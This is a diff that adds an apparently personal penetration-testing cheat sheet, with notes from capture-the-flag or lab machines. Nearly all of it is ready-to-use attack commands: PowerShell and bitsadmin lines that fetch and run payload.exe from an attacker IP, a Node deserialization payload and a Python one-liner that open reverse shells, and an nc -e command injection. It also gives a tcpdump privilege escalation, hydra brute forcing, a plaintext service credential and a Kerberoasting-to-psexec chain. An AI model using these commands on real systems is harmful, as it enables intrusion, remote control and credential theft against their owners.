@@ -1,0 +1,65 @@
+
+disable randomiaze va
+echo 0 > /proc/sys/kernel/randomize_va_space
+enable it with echo 2
+ 
+powershell download files thorugh webshell
+First command: powershell $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile("http://10.10.15.248:9090/payload.exe","C:\inetpub\wwwroot\UploadedFiles\payload.exe")
+ 
+powershell $WebClient = (New-Object System.Net.WebClient).DownloadFile("http://10.10.15.248:9090/payload.exe","C:\inetpub\wwwroot\UploadedFiles\payload.exe")
+ 
+Second command: powershell  C:\inetpub\wwwroot\UploadedFiles\payload.exe
+bitsadmin /transfer myjob /download /priority high http://10.10.15.248:9090/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe"
+Invoke-WebRequest -Uri "http://10.10.15.248/x00/payload.exe" -OutFile "C:\inetpub\wwwroot\UploadedFiles\payload.exe"
+June 12
+ 
+gobuster -u "MACHINEURL" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe
+ 
+hydra -V -l admin -P /usr/share/wordlists/rockyout.txt 10.10.10.86   http-post-form '/login:username=^USER^&password=^PASS^&submit=Login:F=Error: Login failed.'
+nikto -h
+wpscan
+cat dic | sort -u | uniq > dic.dic
+find / -perm 4000 2>/dev/null
+nmap --interactive #to launch a shell form nmap
+!sh
+ 
+curl -X POST -d "file=/var/www/development/uploader/FRANKuploads/php-reverse-shell.gif" http://192.168.0.112:8011/api/files_api.php
+ 
+node serializations payload
+ 
+{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('bash -i >& /dev/tcp/192.168.43.2/1234 0>&1',(e,out,err)=>{console.log(out);}); }()"}
+ 
+ssmanager exploit
+ 
+netstat -ant
+netsat -anu
+ 
+nc -u 127.0.0.1 8839
+again nc -u 127.0.0.1 8839
+add: {"server_port":8003, "password":"test", "method":"||nc 192.168.0.111 3333 -e /bin/bash||"}
+ 
+tcpdump privilege scalation
+cd /tmp
+echo "nc -e /bin/bash 192.168.43.2 5555"> shell
+chmod 777 shell
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
+ 
+python reverse shell
+ 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ 
+SERVER/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
+ 
+KERBEROAST
+first find a user
+then try to find the adminstrator domain
+ldapsearch -x -b "dc=active,dc=htb" -D "SVC_TGS@active.htb" -h 10.10.10.100 -W '(&(objectCategory=person)(objectClass=user))' (USER's)
+ 
+then get a signed ticket from the admins account with impacket
+ 
+GetUserSPNs.py -request -outputfile 20180105_kerberoast.txt -dc-ip 10.10.10.100 active.htb/SVC_TGS
+ 
+then crack the hash
+hashcat -a 0 -m 13100 20180105_kerberoast.txt /usr/share/wordlists/rockyou.txt --force
+then just psexec.py from impacket
